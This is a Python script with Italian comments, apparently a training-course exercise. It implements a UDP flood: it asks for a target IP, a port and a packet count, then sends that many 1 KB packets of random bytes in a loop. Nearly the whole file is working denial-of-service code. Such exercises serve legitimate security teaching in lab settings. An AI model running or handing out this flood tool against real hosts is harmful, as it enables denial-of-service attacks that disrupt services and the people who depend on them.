
#L’esercizio di oggi è scrivere un programma in Python che simuli un UDP flood, ovvero
# l’invio massivo di richieste UDP verso una macchina target che è in ascolto su
# una porta UDP casuale.  Requisiti:

# ● Il programma deve richiedere l’inserimento dell’IP target.
# ● Il programma deve richiedere l’inserimento della porta target.
# ● La grandezza dei pacchetti da inviare è di 1 KB per pacchetto 
# ● Suggerimento: per costruire il pacchetto da 1KB potete utilizzare il modulo «random»
#   per la generazione di byte casuali.
# ● Il programma deve chiedere all’utente quanti pacchetti da 1 KB inviare.

#Importazione moduli
import socket
import random

#istanzio l'oggetto di tipo socket e lo configuro per poter interfacciarsi
#tramite IPv4 e protocollo di trasferimento UDP
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

#Accetto in input dall'utente tutti i parametri necessari ad impostare l'attacco
ip_target = input("Inserisci l'indirizzo IP target:  ")
porta_target = int (input("Inserisci la porta target"))
n_packet = int (input("Quanti pacchetti vuoi inviare?"))

#genero il contenuto del pacchetto invocando il metodo random
packet = random.randbytes(1024)

#tramite un ciclo for gestisco il numero di pacchetti da inviare
for x in range(n_packet):
    s.sendto(packet, (ip_target, porta_target))

#informo l'utente della fine dell'esecuzione del programma
print("Flood eseguito!!")
